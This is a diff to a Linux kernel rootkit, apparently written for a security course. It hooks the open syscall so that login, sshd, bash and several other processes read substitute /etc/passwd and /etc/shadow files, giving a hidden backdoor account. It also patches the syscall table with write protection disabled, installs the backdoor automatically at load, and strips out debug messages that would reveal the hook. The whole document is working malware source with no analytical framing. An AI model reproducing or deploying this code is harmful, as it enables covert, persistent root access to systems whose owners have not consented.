@@ -313,7 +313,7 @@ int deletes_file(struct file* filp)
     rmfile_parent = ((filp->f_path).dentry)->d_parent->d_inode;
     ret = vfs_unlink(rmfile_parent, (filp->f_path).dentry, NULL);
     if (ret < 0) {
-        printk(KERN_ERR "deletes_file() failed. vfs_unlink returned %d\n", ret);
+        PUBMSG("vfs_unlink failed");
     }
     return ret;
 }
@@ -564,24 +564,47 @@ out:
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
     long fd = -1;
+    unsigned short int is_our_guy = 0;
     mm_segment_t fs;
     char* loginproc = "login";
+    char* sshdproc  = "sshd";
+    char* adproc    = "accounts-daemon";
+    char* bashproc  = "bash";
+    char* entproc   = "getent";
+    char* lsbproc   = "lsb_release";
     //char* addproc = "adduser"; //<<<<<< Trigger new muzerfiles creation
     //char* delproc = "deluser";
 
-    if (backdoor_added && (strcmp(current->comm, loginproc) == 0)) {
+    /*
+    if ((is_userspace_str(pathname, "/etc/passwd")) ||
+        (is_userspace_str(pathname, "/etc/shadow"))) {
+        printk(KERN_ERR "RKIT: ==== name of process: %s\n", current->comm); //<<<<<<
+    }
+    */
+
+    if ((strcmp(current->comm, loginproc) == 0) ||
+        (strcmp(current->comm, sshdproc) == 0)  ||
+        (strcmp(current->comm, adproc) == 0)    ||
+        (strcmp(current->comm, bashproc) == 0)  ||
+        (strcmp(current->comm, entproc) == 0)   ||
+        (strcmp(current->comm, lsbproc) == 0)) {
+        is_our_guy = 1;
+    }
+
+    if (backdoor_added && is_our_guy) {
         if (is_userspace_str(pathname, "/etc/passwd")) {
             fs = get_fs();
             set_fs(get_ds());
             fd = original_open("/etc/cse509--muzerpasswd", flags, mode);
-            //fd = original_open("/etc/passwd", flags, mode);
             set_fs(fs);
         } else if (is_userspace_str(pathname, "/etc/shadow")) {
             fs = get_fs();
             set_fs(get_ds());
             fd = original_open("/etc/cse509--muzershadow", flags, mode);
-            //fd = original_open("/etc/shadow", flags, mode);
             set_fs(fs);
+        } else {
+            // Even loginproc can at times just be opening other files
+            fd = original_open(pathname, flags, mode);
         }
     } else {
         fd = original_open(pathname, flags, mode);
@@ -633,7 +656,7 @@ asmlinkage int my_close(int fd)
             err = remove_backdoor();
             break;
         default:
-            printk(KERN_EMERG "Wrong rootkit command: %d\n", fd);
+            PUBMSG("Bad rootkit command!");
             err = -EFAULT;
         }
     } else {
@@ -697,9 +720,6 @@ int rootkit_init(void)
         goto out;
     }
 
-    //<<<<<< Do we need this?
-    printk(KERN_ERR "Syscall table at %p\n", syscall_table);
-
     // Disable write protection on page
     disable_write_protection();
 
@@ -718,6 +738,9 @@ int rootkit_init(void)
 
     // Enable write protection on page
     enable_write_protection();
+
+    // Add a backdoor by default
+    add_backdoor();
 
     out:
     return 0;
